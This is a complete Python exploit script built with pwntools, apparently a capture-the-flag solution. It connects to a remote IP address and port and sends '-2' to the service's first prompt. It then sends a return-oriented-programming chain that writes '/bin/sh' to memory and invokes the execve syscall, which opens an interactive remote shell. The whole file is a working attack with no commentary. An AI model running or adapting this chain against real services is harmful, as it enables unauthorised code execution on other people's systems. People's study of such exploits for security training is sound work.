from pwn import *

# p = elf.process()
p = remote('168.119.108.148', 11010)

pop_rdi = 0x0000000000401b0d
mov = 0x406c3d					# mov qword ptr [rdi], rsi ; ret
pop_rsi = 0x4019a3
data_seg = 0x0040c120
pop_rax = 0x401001
syscall = 0x4013e9
pop_rdx = 0x403d23

p.recv()
p.sendline(b'-2')
p.recv()

payload = b'a'*8
payload += p64(pop_rdi)
payload += p64(data_seg)
payload += p64(pop_rsi)
payload += b'/bin/sh\x00'
payload += p64(mov)

payload += p64(pop_rdi)
payload += p64(data_seg)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

p.sendline(payload)

p.interactive()